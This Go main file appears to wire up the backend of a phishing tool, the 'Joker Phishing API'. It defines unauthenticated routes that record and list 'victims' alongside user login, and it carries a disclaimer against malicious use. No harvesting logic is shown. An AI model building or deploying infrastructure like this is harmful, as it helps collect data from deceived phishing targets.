package main

import (
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/cors"
	"github.com/go-chi/httprate"
	httpSwagger "github.com/swaggo/http-swagger"

	_ "github.com/naijasonezeiru/go-phish-backend/cmd/app/docs"

	"github.com/naijasonezeiru/go-phish-backend/internal/api/handler"
	"github.com/naijasonezeiru/go-phish-backend/internal/api/helper"
	"github.com/naijasonezeiru/go-phish-backend/internal/api/middleware"

	_ "github.com/lib/pq"
)

//	@title			Joker Phishing API
//	@version		1.0
//	@description	This is the backend server for joker phishing.
//	@description	Disclaimer: This is not meant for mailicious activities.

//	@contact.name	Chibby-k Ezeiru
//	@contact.email	ezeiruchibuike@gmail.com

//	@license.name	Apache 2.0
//	@license.url	http://www.apache.org/licenses/LICENSE-2.0.html

//	@host		localhost:8001
//	@BasePath	/v1
func main() {

	port := helper.GetEnv("PORT")

	router := chi.NewRouter()

	router.Use(cors.Handler(cors.Options{
		AllowedOrigins:   []string{"https://*", "http://*"},
		AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowedHeaders:   []string{"*"},
		ExposedHeaders:   []string{"Link"},
		AllowCredentials: false,
		MaxAge:           300,
	}))

	v1Router := chi.NewRouter()

	// v1Router.Use(middleware Logger)

	v1Router.Use(httprate.LimitByIP(100, 1*time.Minute))

	router.Get("/swagger/*", httpSwagger.Handler(
		httpSwagger.URL("http://localhost:8001/swagger/doc.json"), //The url pointing to API definition
	))

	v1Router.Group(func(r chi.Router) {
		v1Router.Post("/users", handler.HandlerRegister)
		v1Router.Post("/auth", handler.LoginHandler)
		v1Router.Get("/victims", handler.HandleGetAllVictims)
		v1Router.Post("/victims", handler.HandleNewVictim)
		v1Router.Get("/healthz", handler.HandleHealth)
		v1Router.Get("/err", handler.HandleErr)
	})

	// TODO: add auth middleware
	// v1Router.Group(func(r chi.Router) {
	// 	v1Router.Use(middleware.AuthMiddleware)
	// 	v1Router.Get("/users/me", handler.HandlerGetMe)
	// })
	v1Router.With(middleware.AuthMiddleware).Get("/users/me", handler.HandlerGetMe)

	router.Mount("/v1", v1Router)

	srv := &http.Server{
		Handler: router,
		Addr:    ":" + port,
	}

	log.Printf("Server starting on PORT:%v", port)

	log.Fatal(srv.ListenAndServe())

	fmt.Println("PORT:", port)
}
